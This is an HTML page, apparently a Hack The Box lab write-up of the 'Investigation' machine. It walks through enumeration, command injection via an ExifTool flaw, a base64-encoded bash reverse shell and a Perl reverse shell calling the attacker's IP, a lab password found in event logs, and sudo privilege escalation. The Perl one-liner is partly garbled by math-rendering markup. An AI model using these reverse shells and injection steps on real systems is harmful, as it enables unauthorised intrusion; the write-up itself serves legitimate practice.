@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>HTB Ivestigation - HTB Writeups</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/katex/katex.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">HTB Ivestigation</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1675701612725"
+                  >2023-02-06 11:40</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1675718983388"
+                  >2023-02-06 16:29</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We do an initial nmap scan<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.197<br />
+<img src="/_resources/cfac6cb2fb064a298bc70c6cc90c71bd.png" /><br />
+This tells us we need to make an entry into our /etc/hosts file for:<br />
+<a title="http://eforenzics.htb/" href="http://eforenzics.htb/">http://eforenzics.htb/</a></p>
+<p>We repeat the nmap scan and the host resolves:<br />
+nmap -sC -sV -oA nmap/initial 10.10.11.197<br />
+<img src="/_resources/c2bbfaf22d2b4a97ac7ca6f998f1799f.png" /></p>
+<p>A full port scan tells us there are no other open TCP ports:<br />
+nmap -p- nmap/full 10.10.11.197<br />
+<img src="/_resources/fdf5e332f16842cc91575114c0498d5a.png" /></p>
+<p>We visit the site on port 80.<br />
+There is a page to upload jpg files, and not much else:<br />
+<img src="/_resources/267df9f4956e4118afdb962de691f3fa.png" /><br />
+We run gobuster in the background nonetheless.</p>
+<p>gobuster dir -u <a title="http://eforenzics.htb/" href="http://eforenzics.htb/">http://eforenzics.htb/</a> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b "400,404,204,301,302,307,401,403,500"</p>
+<p>The upload link is for a php file:<br />
+<img src="/_resources/f4317e88c20742f3a8e66aab4af89df9.png" /></p>
+<p>We use the magic bytes for a jpg to make a webshell:<br />
+<a title="https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/" href="https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/">https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/</a></p>
+<p><img src="/_resources/34dd97ee71764f5ba08efa539b246fb3.png" /></p>
+<p>That fails, but it gives us feedback that we can upload a png file. We find a shell generator that someone made on github:<br />
+<a title="https://github.com/jimmygiv/simpleshell" href="https://github.com/jimmygiv/simpleshell">https://github.com/jimmygiv/simpleshell</a></p>
+<p>We use the png setting and upload a webshell:<br />
+<img src="/_resources/80bca534c1734b9685ee6b5b03612582.png" /></p>
+<p>We follow the link and it tells us the image was uploaded, that it will only be available for five minutes. We do not have directory information about where the file is stores, so we cannot call it:<br />
+<img src="/_resources/ae56b5a5563b4272885cd099fb8a6a17.png" /></p>
+<p>We have the version number of ExifTool which apparently has a path traversal vulnerability<br />
+<a title="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429" href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429">https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429</a></p>
+<p>We test in the same way we see in the post:<br />
+<img src="/_resources/62599f597c43466fbc2ad90d87af2f39.png" /><br />
+It works.</p>
+<p>We encode a reverse shell bash line:<br />
+echo "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.57/4444 0&gt;&amp;1" | base64<br />
+<img src="/_resources/7d0364eae8304c66ae8e8cd65463f906.png" /></p>
+<p>We use the following payload in burpsuite and gain a shell:<br />
+echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU3LzQ0NDQgMD4mMQo=' | base64 -d| bash|</p>
+<p><img src="/_resources/9ec2e26f0140485d98b123c3c5efe2cf.png" /></p>
+<p><img src="/_resources/d8704331bfce4467969c4b8a4dceecab.png" /></p>
+<p>We find a hidden file in /usr/local/investigation:<br />
+<img src="/_resources/459b24b2a6a64f838f72dd3675947d1f.png" /></p>
+<p>It is an Ms outlook message:<br />
+<img src="/_resources/9e63414a25f34608bce7d935da7046b1.png" /></p>
+<p>We transfer the file to our machine using netcat, then use this online converter:<br />
+<a title="https://products.aspose.app/email/viewer/msg" href="https://products.aspose.app/email/viewer/msg">https://products.aspose.app/email/viewer/msg</a><br />
+<img src="/_resources/ea34c73f883c44b88f6fa834dd1f265c.png" /><br />
+This site allows for us to use the email we downloaded to get the attachment file in the email:<br />
+<a title="https://www.encryptomatic.com/viewer/" href="https://www.encryptomatic.com/viewer/">https://www.encryptomatic.com/viewer/</a></p>
+<p>We use the following python script to extract the evtx file into an xml document:<br />
+<a title="https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py" href="https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py">https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py</a></p>
+<p>Rather than sift through this long document, we use grep to search for username:<br />
+python2 evtx_dump.py security.evtx | grep UserName</p>
+<p>We find some credentials<br />
+<img src="/_resources/66db318372b54b9eafdb3e9fa317dbf5.png" /></p>
+<p>Def@ultf0r3nz!csPa$$<br />
+We can try to ssh into the machine with these credentials:</p>
+<p><img src="/_resources/ff05bf70043e470bb1112504eef25216.png" /></p>
+<p>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" smorton@10.10.11.197<br />
+<img src="/_resources/0f9b95e33a1646acb53fc42c74ed0c91.png" /></p>
+<p>smorton has sudo rights to use /usr/bin/binary<br />
+<img src="/_resources/3c3d85cb1a894d25985c267d70eada51.png" /></p>
+<p>Since we don't know what that binary does, we transfer it to our machine and try to look at it.<br />
+We cannot look at the binary locally, but can use <a title="https://dogbolt.org/" href="https://dogbolt.org/">https://dogbolt.org/</a> to explore the code:<br />
+<img src="/_resources/10cac9c95b9040cc8a96c0dce331c8b9.png" /></p>
+<p>We can see that the binary executes a curl command. so maybe if we feed it a binary or file with our IP we can call a reverse shell with root privileges:<br />
+The argument name is given here:<br />
+<img src="/_resources/869ffc74467f4f20afd4f2826931631f.png" /><br />
+lDnxUysaQn<br />
+The same filename we saw in the user's home dir:<br />
+<img src="/_resources/c710ce4132a04992b98ad9ba109e1b39.png" /><br />
+The code also tells us what language the file should be written in:<br />
+<img src="/_resources/f0cadb33ec0446d99000bd4cf99b88a6.png" /></p>
+<p>We can try generating a perl revese shell.</p>
+<p>use Socket;<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi mathvariant="normal">"</mi><mn>10.10.14.57</mn><mi mathvariant="normal">"</mi><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">i="10.10.14.57";</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord">"10.10.14.57"</span><span class="mpunct">;</span></span></span></span></span>p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>i</mi><mi>n</mi><mi>e</mi><msub><mi>t</mi><mi>a</mi></msub><mi>t</mi><mi>o</mi><mi>n</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">p,inet_aton(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em"></span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mopen">(</span></span></span></span></span>i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};</p>
+<p>We do no have write permissions on the file though. We rename the original to old, and the write our file with the filename:<br />
+<img src="/_resources/b4936eb01bdf4b8a8dc004ab6dcc53c5.png" /></p>
+<p>We test it by opening a nc listener and seeing what the binary will do:<br />
+<img src="/_resources/bd8869a5448644129bb6497943bac232.png" /><br />
+<img src="/_resources/d9106c576dbe4f788c4e26d85567282d.png" /></p>
+<p>We host the reverse shell pl script on our kali machine, open the simple server.<br />
+<img src="/_resources/5474c526ffec46aaad92d6a50f3bb97a.png" /></p>
+<p>We run sudo binary 10.10.14.57/shell.pl lDnxUysaQn on the remote machine<br />
+<img src="/_resources/4379b13a5da4411598af66a2d6ba839f.png" /></p>
+<p>Then we get a our shell:<br />
+<img src="/_resources/a1a001c33277401bb1b10764b1248450.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
